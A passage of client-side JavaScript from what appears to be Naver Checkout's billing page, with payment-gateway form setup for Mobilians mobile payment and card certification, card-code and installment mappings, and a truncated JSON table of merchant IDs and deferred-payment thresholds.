									form.value('Failurl', result.Failurl);
									form.value('Prdtprice', result.Prdtprice);
									form.value('Cryptyn', 'Y');
													form.value('PAY_MODE', '10');
									form.value('Prdtnm', common.value('TITLE'));
									form.value('Siteurl', 'checkout.naver.com');
									form.value('Tradeid', str.sid);
									form.value('LOGO_YN', 'Y');
									form.value('CALL_TYPE', 'I');
									form.value('IFRAME_NAME', common.value('PREIFRAME'));
									form.value('MC_No', common.value('PAYNO'));
									form.value('MC_FIXNO', 'Y');
									form.value('Payeremail', '');
									form.value('Userid', common.value('USERID'));
									form.value('Item', '');
									form.value('Prdtcd', '');
									form.value('Closeurl', common.value('CLOSEURL'));
									form.value('MSTR', '');
									form.value('CP_UI', type);
									
									var callUrl = "http://mup.mobilians.co.kr/MUP/goMcashMain.mcash";
									
									var tForm = document.getElementById("pgForm_60A");
					
									tForm.action=callUrl;
									tForm.target=common.value('PREIFRAME');
									if (typeof callbackFn2 == 'function') {
										common.value('MSG','success');
										common.value('PGFORMNAME','pgForm_60A');
										common.value('CHARSET', 'UTF-8');
										callbackFn2(common.$value());
									} else {
										tForm.submit();
									}
									
									return false;
								}
							);
							
							
						
							}
						)
						
					}
					</script><script type="text/javascript">
					var bill_mobilFrameType = $H();
					bill_mobilFrameType.add('PC_CHECKOUT','CO' );
					bill_mobilFrameType.add('PC_SELLERCENTER','SC' );
					bill_mobilFrameType.add('PC_MERCHANTCENTER','CP' );
					bill_mobilFrameType.add('MOBILE_CHECKOUT','CO' );
					bill_mobilFrameType.add('MOBILE_MARKET','RM' );
					bill_mobilFrameType.add('MOBILE_BAND','BD' );
					
					function takeIframe_05A(type) {
						if (bill_mobilFrameType.hasKey(type)) {
							return bill_mobilFrameType.$(type);
						}
						return "";
					}
					
					function getIframeUrl_05A() {
						var MCASH_MAIN_URL ="";
							MCASH_MAIN_URL = "http://mup.mobilians.co.kr/MUP/goMcash.mcash";
						return MCASH_MAIN_URL;
					}
					
					function init_05A() {
						return false;
					}
					
					function pgApproval_05A(fm) {
						return 'success';
					}
					
					function approval_05A(common, form, callbackFn, callbackFn2) {
						var result ;
						approval_paramInit_05A(form);
						if (common.value('ISSKNORMALUSER') == 'Y') {
							result= pgApproval_05A(form.$value());
							callbackFn( result );
						} else if (common.value('CORPCD') == 'SKT' && common.value('ISSKNORMALUSER') == 'N'){
							result = pgPreApproval_05A(common, form, callbackFn, callbackFn2);
						} else if (common.value('ISSKNORMALUSER') == 'NONE') {
							var command = "NAVER_NW";
							if (bill.variable._device == "MOBILE") {
								command = "NAVER_NM";
							}
							pgApproval_05A_auth(common, form, command, callbackFn, callbackFn2);
						} else {
							callbackFn( 'error : unsupported' );
						}
					}
					
					function approval_paramInit_05A(form) {
						form.value('mUserKey','');
						form.value('Okurl', '');
						form.value('Cryptstring', '');
						form.value('Failurl', '');
						form.value('Prdtprice', '');
						form.value('SocialNo', '');
					}
					
					function pgPreApproval_05A(common, form, callbackFn, callbackFn2) {
						var command = "CERT";
						if (bill.variable._device == "MOBILE") {
							command = "MCERT";
						}
						return authenticateWithMcash(common, form, command, callbackFn, callbackFn2);
					}
					
					function postApproval_05A(common, form, callbackFn, callbackFn2) {
						pgPostApproval_05A(common, form, callbackFn, callbackFn2);
						return false;
					}
					
					function pgPostApproval_05A(common, form, callbackFn, callbackFn2) {
						var command = "CNFM";
						if (bill.variable._device == "MOBILE") {
							command = "MCNFM";
						}
						authenticateWithMcash(common, form, command, callbackFn, callbackFn2);
						return false;
					}
					
					function authenticateWithMcash(common, form, type, callbackFn, callbackFn2){
						bill.variable._lastCallbackFn = callbackFn;
						bill.variable._returnForm = form;
						
						var iframeType = takeIframe_05A(common.value('IFRAMETYPE'));
						var Cryptstring	= common.value('AMT') + common.value('RURL');	
					
						bill.encryptWithCors('enc','05A',$H({Okurl : common.value('RURL'), Cryptstring :Cryptstring, Failurl : common.value('CURL'), Prdtprice : common.value('AMT'), SocialNo : common.value('RESNO'), HASHKEY: common.value('SID'), NAMES : 'Okurl, Failurl, SocialNo, HASHKEY, Prdtprice, Cryptstring'}), 
							function(result){
								if( result == 'error'){ callbackFn('error');} 	
								form.value('Okurl', result.Okurl); 
								form.value('Cryptstring', result.Cryptstring); 
								form.value('Failurl', result.Failurl); 
								form.value('Prdtprice', result.Prdtprice); 
								form.value('SocialNo', result.SocialNo); 
								form.value('CP_UI', type);
								form.value('Prdtnm', common.value('TITLE'));
								form.value('Siteurl', 'checkout.naver.com');
								form.value('Tradeid', common.value('SID'));
								form.value('MC_SVCID', '120109480001');
								form.value('MC_FIXCOMMID', common.value('CORPCD'));
								form.value('MC_No', common.value('PAYNO'));
								form.value('MSTR', '');
								form.value('Payeremail', '');
								form.value('Userid', '');
								form.value('Prdtcd', '');
								form.value('Item', '');
								form.value('CP_UI_STYLE', iframeType);
								form.value('Closeurl', common.value('CLOSEURL'));
								
								if (type == 'CNFM' || type == 'MCNFM') {
									form.value('ansimFlag', common.value('ANSIMFG'));
									form.value('safeguard', common.value('SAFEFG'));
									form.value('phoneId', common.value('PAYKEY'));
									form.value('Mobilid', common.value('AUTHNO'));
								}
								
								
								var tForm = document.getElementById("pgForm_05A");
								if(type == 'CERT' || type == 'MCERT'){
									tForm.target=common.value('PREIFRAME');
								}else{
									tForm.target=common.value('POSTIFRAME');
								}
								
								tForm.action=getIframeUrl_05A();
								if (typeof callbackFn2 == 'function') {
									common.value('MSG','success');
									common.value('PGFORMNAME','pgForm_05A');
									common.value('CHARSET', 'UTF-8');
									callbackFn2(common.$value());
								} else {
									tForm.submit();
								}
								
								
							}
						);
					}
					
					function pgApproval_05A_auth(common, form, type, callbackFn, callbackFn2) {
						bill.variable._lastCallbackFn = callbackFn;
						bill.variable._returnForm = form;
						
						var Cryptstring	= common.value('AMT') + common.value('RURL');
						
						bill.encryptWithCors('enc','05A',$H({Okurl : common.value('RURL'), Cryptstring :Cryptstring, Failurl : common.value('CURL'), Notiurl : common.value('RURL'), Prdtprice : common.value('AMT'), HASHKEY: common.value('SID'), VER : "2", NAMES : 'Okurl, Failurl, Notiurl, Prdtprice, Cryptstring, VER, HASHKEY'}), 
							function(result){
								if( result == 'error'){ callbackFn('error');}
								form.value('Cryptstring', result.Cryptstring);
								form.value('Okurl', result.Okurl);
								form.value('Failurl', result.Failurl);
								form.value('Prdtprice', result.Prdtprice);
								form.value('Cryptyn', 'Y');
								form.value('MC_SVCID', '120109480001');
								form.value('PAY_MODE', '10');
								form.value('Prdtnm', common.value('TITLE'));
								form.value('Siteurl', 'checkout.naver.com');
								form.value('Tradeid', common.value('SID'));
								form.value('LOGO_YN', 'Y');
								form.value('CALL_TYPE', 'I');
								form.value('IFRAME_NAME', common.value('PREIFRAME'));
								form.value('MC_No', common.value('PAYNO'));
								form.value('MC_FIXNO', 'Y');
								form.value('Payeremail', '');
								form.value('Userid', '');
								form.value('Item', '');
								form.value('Prdtcd', '');
								form.value('Closeurl', common.value('CLOSEURL'));
								form.value('MSTR', '');
								form.value('CP_UI', type);
						
								var callUrl = "http://mup.mobilians.co.kr/MUP/goMcashMain.mcash";
								
								var tForm = document.getElementById("pgForm_05A");
								
						
								tForm.action=callUrl;
								tForm.target=common.value('PREIFRAME');
								if (typeof callbackFn2 == 'function') {
									common.value('MSG','success');
									common.value('PGFORMNAME','pgForm_05A');
									common.value('CHARSET', 'UTF-8');
									callbackFn2(common.$value());
								} else {
									tForm.submit();
								}
								
								
								return false;
							}
						);
					}
					</script><div id="01A_OBJECT"></div>										    							   
						<script language="javascript" src="http://dbill.naver.com/dist/js/certificationModule.js?ts=1647221954893" type="text/javascript"></script>
					<script type="text/javascript">
					
					//pg사 carcd로 변환하는 코드를 생성한다.
					var bill_cardcdMap = $H();
						bill_cardcdMap.add('C0','CCLG');
						bill_cardcdMap.add('C1','CCBC');
						bill_cardcdMap.add('C2','CCKJ');
						bill_cardcdMap.add('C3','CCKM');
						bill_cardcdMap.add('C4','CCNH');
						bill_cardcdMap.add('C5','CCLO');
						bill_cardcdMap.add('C7','CCSS');
						bill_cardcdMap.add('C8','CCSU');
						bill_cardcdMap.add('C9','CCCT');
						bill_cardcdMap.add('CA','CCKE');
						bill_cardcdMap.add('CB','CCPH');
						bill_cardcdMap.add('CC','CCJB');
						bill_cardcdMap.add('CD','CCCJ');
						bill_cardcdMap.add('CF','CCHN');
						bill_cardcdMap.add('CH','CCDI');
						bill_cardcdMap.add('CR','UPOP');
					
					//pg사 carcd로 변환하는 코드를 생성한다.
					var bill_quotaMap = $H();
					bill_quotaMap.add('01','0' );
					bill_quotaMap.add('02','2' );
					bill_quotaMap.add('03','3' );
					bill_quotaMap.add('04','4' );
					bill_quotaMap.add('05','5' );
					bill_quotaMap.add('06','6' );
					bill_quotaMap.add('07','7' );
					bill_quotaMap.add('08','8' );
					bill_quotaMap.add('09','9' );
					bill_quotaMap.add('10','10' );
					bill_quotaMap.add('11','11' );
					bill_quotaMap.add('12','12' );
					bill_quotaMap.add('18','18' );
					bill_quotaMap.add('24','24' );
					bill_quotaMap.add('36','36' );
					
					
					function convertCardCd_01A(cardcd){
						if(bill_cardcdMap.hasKey(cardcd)) {
							return bill_cardcdMap.$(cardcd);
						}
						return '';
					}
					
					function convertQuota_01A(quota){
						if(bill_quotaMap.hasKey(quota)) {
							return bill_quotaMap.$(quota);
						}
						return '';
					}
					
					function init_01A() {
						return true;	
					}
					
					function pgApproval_01A(fm, form, callbackFn) {
						certification.request({
							isMobile: form.value('isMobile') == 'true',
							environment: fm.environment.value, 
							serviceId: fm.serviceId.value,
							cardCompanyId: fm.cardCompanyId.value,
							merchantName: fm.merchantName.value,
							amount: fm.amount.value,
							itemName: fm.itemName.value,
							installmentTerm: fm.installmentTerm.value,
							interestFreeYn: fm.interestFreeYn.value,
							domainUri: fm.domainUri.value,
							useCardCertification: form.value('useCardCertification') == 'true',
							callbackFunc : function (response){
								if(response.result == 'success'){
									
									   form.value('tid', response.data.tid);
									form.value('kvpCardCode', response.data.kvpCardCode||'');
									form.value('sessionKey', response.data.sessionKey||'');
									form.value('encryptData', response.data.encryptData||'');    		
							
									form.value('cavv', response.data.cavv||'');
									form.value('xid', response.data.xid||'');
									form.value('eci', response.data.eci||'');
									form.value('certData', response.data.certData||'');
										
									callbackFn("success");
								}else{
									form.value('MSG', '결제가 처리되지 않았습니다');
									if(response.message){
										form.value('MSG', response.message);
									}
									callbackFn("failmsg");
								}
							}
						});
						
						
					}
					
					function approval_01A(common, form, callbackFn) {
						bill.variable._lastCallbackFn = callbackFn;
						bill.variable._returnForm = form;
						bill.variable._returnCommonForm = common;	
						
						var npcbCheckString = bill.npcbCheckStr('01A', common);
						var npcbBlock=false;
					
						bill.commonTransferData(bill.variable._npcbCheckUrl, $H(npcbCheckString), function(str) {
							if(str=='error') {
								npcbBlock=true;
							}
						});
					
						if(npcbBlock==true) {
							return;
						}
							
						form.value('domainUri', location.protocol.concat('//').concat(location.hostname));
						
						form.value('itemName', common.value('TITLE'));
						form.value('amount', common.value('AMT'));
						
						var cardcode = convertCardCd_01A(common.value('CORPCD'));
						form.value('cardCompanyId', cardcode );
						//국민/우리카드의 경우, useCardCertification 'true' 이고 그 외는 'false'
						if(common.value('CORPCD') == 'C3' || common.value('CORPCD') == 'CB') {
							form.value('useCardCertification', 'true');	
						}
						var install = convertQuota_01A(common.value('INSTMO'));
						if(install == '') {
							install = "00";
						} else if( install.length == 1) {
							install = "0" + install;
						}
						form.value('installmentTerm', install);
						
					
						form.value('PGID', bill.convertPgId('01057', common.value('CORPCD'), install, common.value('AMT')));
						form.value('mid_common', bill.convertPgMid('01057', common.value('CORPCD'), install, 'naver_smartstore01', common.value('AMT')));
						form.value('mid_point', bill.convertPgSubMid('01057', common.value('CORPCD'), install, 'naver_smartstore01', common.value('AMT')));
						form.value('serviceId',  form.value('mid_common'));
						if(common.value('NOINTEREST') == 'Y' && common.value('NOINTERESTTYPE') == '01') {
							form.value('interestFreeYn', 'y');
						}
						
						if (bill.isDefermentPay('01057', common.value('CORPCD'), install, common.value('AMT'))) {
							form.value('NOINT_NDISP', '1');
						} else {
							form.value('NOINT_NDISP', '');
						}
					
						//PG 모듈 호출
						var result= pgApproval_01A(form.$value(), form, callbackFn);
						//callbackFn( result );
					}
					
					function return_success_01A(msg) {
						bill.variable._lastCallbackFn("success");
					}
					
					function return_fail_01A(msg) {
						bill.variable._returnForm.value("MSG", msg);
						bill.variable._lastCallbackFn("nomatcherror");
					}
					</script><script type="text/javascript">
					function pgApproval_02C(fm) {
						return 'success';
					}
					
					function init_02C() {
						;
					}
					
					function approval_02C(common, form, callbackFn) {
						var result = pgApproval_02C(form.$value()); 
						callbackFn( result );
					}
					</script>
					<script type="text/javascript">
					var bill = {};
					bill.variable = {
						_initPG : $H({}),
						_approvalPG : $H({}),
						_postApprovalPG : $H({}),
						_formPG : $H({}),
						_preCallUrl : "http://billing.checkout.naver.com/pay/preApproval.nhn",
						_preCertUrl : "http://billing.checkout.naver.com/pay/preCertApproval.nhn",
						_npcbCheckUrl : "http://billing.checkout.naver.com/pay/circuitBreakerState.nhn",
						_callUrl : "http://billing.checkout.naver.com/pay/approval2.nhn",
						_postCallCorsUrl : "http://billing.checkout.naver.com/pay/postApprovalWithCors.nhn",  
						_postCallUrl : "http://billing.checkout.naver.com/pay/postApproval.nhn",
						_mobileSurl : "",
						_mobileRurl : "",
						_virCallUrl : "http://billing.checkout.naver.com/pay/callVirNo.nhn",
						_maxTxtSize : 1728,
						_minTxtSize : 50,
						_chunkSize : 100,
						_bInit : false,
						_init : function() {
							this._initPG.add('01057', init_01A);
							this._approvalPG.add('01057', approval_01A);
							this._formPG.add('01057', $Form('pgForm_01A').$value());
								this._formPG.add('01029', $Form('pgForm_01A').$value());
								this._formPG.add('01030', $Form('pgForm_01A').$value());
								this._formPG.add('01057', $Form('pgForm_01A').$value());
								this._formPG.add('01058', $Form('pgForm_01A').$value());
								this._formPG.add('01059', $Form('pgForm_01A').$value());
								this._formPG.add('01060', $Form('pgForm_01A').$value());
								this._formPG.add('01061', $Form('pgForm_01A').$value());
								this._formPG.add('01043', $Form('pgForm_01A').$value());
								this._formPG.add('01044', $Form('pgForm_01A').$value());
								this._formPG.add('01053', $Form('pgForm_01A').$value());
								this._formPG.add('01026', $Form('pgForm_01A').$value());
								this._formPG.add('01027', $Form('pgForm_01A').$value());
								this._formPG.add('01028', $Form('pgForm_01A').$value());
								this._formPG.add('01063', $Form('pgForm_01A').$value());
								this._formPG.add('01064', $Form('pgForm_01A').$value());
								this._formPG.add('01065', $Form('pgForm_01A').$value());
								this._formPG.add('01066', $Form('pgForm_01A').$value());
								this._formPG.add('01067', $Form('pgForm_01A').$value());
								this._formPG.add('01068', $Form('pgForm_01A').$value());
								this._formPG.add('01023', $Form('pgForm_01A').$value());
								this._formPG.add('01024', $Form('pgForm_01A').$value());
								this._formPG.add('01069', $Form('pgForm_01A').$value());
								this._formPG.add('01052', $Form('pgForm_01A').$value());
								this._formPG.add('01054', $Form('pgForm_01A').$value());
								this._formPG.add('01055', $Form('pgForm_01A').$value());
								this._formPG.add('01056', $Form('pgForm_01A').$value());
								this._formPG.add('01025', $Form('pgForm_01A').$value());
								this._formPG.add('01070', $Form('pgForm_01A').$value());
								this._formPG.add('01045', $Form('pgForm_01A').$value());
								this._formPG.add('01046', $Form('pgForm_01A').$value());
								this._formPG.add('01047', $Form('pgForm_01A').$value());
								this._formPG.add('01048', $Form('pgForm_01A').$value());
								this._formPG.add('01049', $Form('pgForm_01A').$value());
								this._formPG.add('01050', $Form('pgForm_01A').$value());
								this._formPG.add('01051', $Form('pgForm_01A').$value());
								this._formPG.add('01062', $Form('pgForm_01A').$value());
								this._formPG.add('70019', $Form('pgForm_01A').$value());
								
							this._initPG.add('02001', init_02C);
							this._approvalPG.add('02001', approval_02C);
							this._formPG.add('02001', $Form('pgForm_02C').$value());
								
							this._initPG.add('04001', init_04F);
							this._approvalPG.add('04001', approval_04F);
							this._formPG.add('04001', $Form('pgForm_04F').$value());
								
							this._initPG.add('05005', init_05A);
							this._approvalPG.add('05005', approval_05A);
							this._postApprovalPG.add('05005', postApproval_05A);
							this._formPG.add('05005', $Form('pgForm_05A').$value());
								
							this._initPG.add('60001', init_60A);
							this._approvalPG.add('60001', approval_60A);
							this._formPG.add('60001', $Form('pgForm_60A').$value());
								
							this._initPG.add('40001', init_40A);
							this._approvalPG.add('40001', approval_40A);
							this._formPG.add('40001', $Form('pgForm_40A').$value());
								
							this._initPG.add('51277', init_51A);
							this._approvalPG.add('51277', approval_51A);
							this._formPG.add('51277', $Form('pgForm_51A').$value());
								
							
							this._bInit = true;
						},
						_defermentPayList : '{"51304C010":{"submid":"naver_PG48","pgid":"51310","mid":"naver_PG48","minamt":"300000"},"51065CH10":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"300000"},"51251CH10":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"300000"},"51053C006":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"200000"},"51053C003":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"100000"},"51073CH10":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"300000"},"51053C002":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"100000"},"51053C010":{"submid":"naver_shoppay07","pgid":"51054","mid":"naver_shoppay07","minamt":"300000"},"01065C002":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"100000"},"51223C006":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"200000"},"01069CH10":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"300000"},"01065C003":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"100000"},"51316CH10":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"300000"},"51223C002":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"100000"},"51223C003":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"100000"},"51290CH06":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"100000"},"51219CH10":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"300000"},"51294C010":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"300000"},"51251CH06":{"submid":"naver_booking04","pgid":"51252","mid":"naver_booking04","minamt":"100000"},"51073CH06":{"submid":"naver_shoppay43","pgid":"51096","mid":"naver_shoppay43","minamt":"100000"},"51270C002":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"100000"},"51270C003":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"100000"},"51243CH06":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"100000"},"01065C006":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"200000"},"01049C006":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"200000"},"01065C010":{"submid":"naver_order22","pgid":"01066","mid":"naver_order22","minamt":"300000"},"01049C003":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"100000"},"01049C002":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"100000"},"51290CH10":{"submid":"naver_local_kicc04","pgid":"51291","mid":"naver_local_kicc04","minamt":"300000"},"51294C006":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"200000"},"51294C002":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"100000"},"51294C003":{"submid":"naver_shoppay84","pgid":"51295","mid":"naver_shoppay84","minamt":"100000"},"51243CH10":{"submid":"naver_PG17","pgid":"51244","mid":"naver_PG17","minamt":"300000"},"51107CH10":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"300000"},"51269C006":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"200000"},"51269C002":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"100000"},"51269C003":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"100000"},"01023CH10":{"submid":"naver_shoppay02","pgid":"01024","mid":"naver_shoppay02","minamt":"300000"},"51069C010":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"300000"},"01049C010":{"submid":"naver_local_kis02","pgid":"01050","mid":"naver_local_kis02","minamt":"300000"},"51297CH10":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"300000"},"51107CH06":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"01061CH06":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"100000"},"51109C002":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"100000"},"01057C010":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"300000"},"51235CH06":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"100000"},"51109C003":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"100000"},"01057C002":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"100000"},"51235CH10":{"submid":"naver_PG09","pgid":"51236","mid":"naver_PG09","minamt":"300000"},"01057C003":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"100000"},"51109C006":{"submid":"naver_shoppay60","pgid":"51110","mid":"naver_shoppay60","minamt":"200000"},"01057C006":{"submid":"naver_smartstore02","pgid":"01058","mid":"naver_smartstore02","minamt":"200000"},"51297CH06":{"submid":"naver_PG62","pgid":"51299","mid":"naver_PG62","minamt":"100000"},"51316CH06":{"submid":"naver_PG60","pgid":"51317","mid":"naver_PG60","minamt":"100000"},"51283CH06":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"100000"},"51060C002":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"100000"},"51060C003":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"100000"},"51239C003":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"100000"},"01053CH10":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"300000"},"51267CH06":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"100000"},"51239C006":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"200000"},"51259CH06":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"100000"},"51082CH10":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"300000"},"51239C002":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"100000"},"51259CH10":{"submid":"naver_PG26","pgid":"51260","mid":"naver_PG26","minamt":"300000"},"51307CH10":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"300000"},"51267CH10":{"submid":"naver_PG32","pgid":"51273","mid":"naver_PG32","minamt":"300000"},"51072CH10":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"300000"},"51277C010":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"300000"},"01061CH10":{"submid":"naver_booking10","pgid":"01062","mid":"naver_booking10","minamt":"300000"},"01053CH06":{"submid":"naver_order14","pgid":"01054","mid":"naver_order14","minamt":"100000"},"51060C010":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"300000"},"51245C002":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"100000"},"51245C003":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"100000"},"51245C006":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"200000"},"01047CH10":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"300000"},"51239C010":{"submid":"naver_PG13","pgid":"51240","mid":"naver_PG13","minamt":"300000"},"51287C010":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"300000"},"51069C003":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"100000"},"51072CH06":{"submid":"naver_shoppay42","pgid":"51095","mid":"naver_shoppay42","minamt":"100000"},"51069C002":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"100000"},"51277C006":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"200000"},"51307CH06":{"submid":"naver_PG54","pgid":"51313","mid":"naver_PG54","minamt":"100000"},"51060C006":{"submid":"naver_shoppay14","pgid":"51061","mid":"naver_shoppay14","minamt":"200000"},"51277C002":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"100000"},"51277C003":{"submid":"naver_smartstore06","pgid":"51278","mid":"naver_smartstore06","minamt":"100000"},"51069C006":{"submid":"naver_shoppay37","pgid":"51070","mid":"naver_shoppay37","minamt":"200000"},"51245C010":{"submid":"naver_PG23","pgid":"51246","mid":"naver_PG23","minamt":"300000"},"01047CH06":{"submid":"naver_booking06","pgid":"01048","mid":"naver_booking06","minamt":"100000"},"51261C010":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"300000"},"51261C003":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"100000"},"51261C002":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"100000"},"51287C003":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"100000"},"51287C002":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"100000"},"51255C010":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"300000"},"51261C006":{"submid":"naver_order10","pgid":"51262","mid":"naver_order10","minamt":"200000"},"51287C006":{"submid":"naver_order20","pgid":"51288","mid":"naver_order20","minamt":"200000"},"01043C003":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"100000"},"01043C002":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"100000"},"51076C002":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"100000"},"51266CH10":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"300000"},"51065CH06":{"submid":"naver_shoppay28","pgid":"51066","mid":"naver_shoppay28","minamt":"100000"},"51076C003":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"100000"},"01043C006":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"200000"},"51076C006":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"200000"},"51249CH10":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"300000"},"51082CH06":{"submid":"naver_shoppay44","pgid":"51097","mid":"naver_shoppay44","minamt":"100000"},"51217CH06":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"100000"},"51283CH10":{"submid":"naver_booking16","pgid":"51284","mid":"naver_booking16","minamt":"300000"},"51302CH06":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"100000"},"51255C003":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"100000"},"51255C002":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"100000"},"51302CH10":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"300000"},"01043C010":{"submid":"naver_PG02","pgid":"01044","mid":"naver_PG02","minamt":"300000"},"51266CH06":{"submid":"naver_PG30","pgid":"51272","mid":"naver_PG30","minamt":"100000"},"51249CH06":{"submid":"naver_PG21","pgid":"51250","mid":"naver_PG21","minamt":"100000"},"01069CH06":{"submid":"naver_local_kicc02","pgid":"01070","mid":"naver_local_kicc02","minamt":"100000"},"51076C010":{"submid":"naver_shoppay28","pgid":"51077","mid":"naver_shoppay28","minamt":"300000"},"51255C006":{"submid":"naver_local_kis04","pgid":"51256","mid":"naver_local_kis04","minamt":"200000"},"51223C010":{"submid":"naver_PG04","pgid":"51224","mid":"naver_PG04","minamt":"300000"},"51217CH10":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"300000"},"51302C002":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"100000"},"51302C003":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"100000"},"01067C003":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"100000"},"51071CH06":{"submid":"naver_shoppay41","pgid":"51094","mid":"naver_shoppay41","minamt":"100000"},"51302C006":{"submid":"naver_PG42","pgid":"51308","mid":"naver_PG42","minamt":"200000"},"01067C006":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"200000"},"01059C006":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"200000"},"01059C002":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"100000"},"01059C003":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"100000"},"51268C010":{"submid":"naver_PG34","pgid":"51274","mid":"naver_PG34","minamt":"300000"},"51292CH10":{"submid":"naver_shoppay82","pgid":"51293","mid":"naver_shoppay82","minamt":"300000"},"01059C010":{"submid":"naver_smartstore04","pgid":"01060","mid":"naver_smartstore04","minamt":"300000"},"51217C010":{"submid":"naver_shoppay65","pgid":"51218","mid":"naver_shoppay65","minamt":"300000"},"01067C010":{"submid":"naver_order24","pg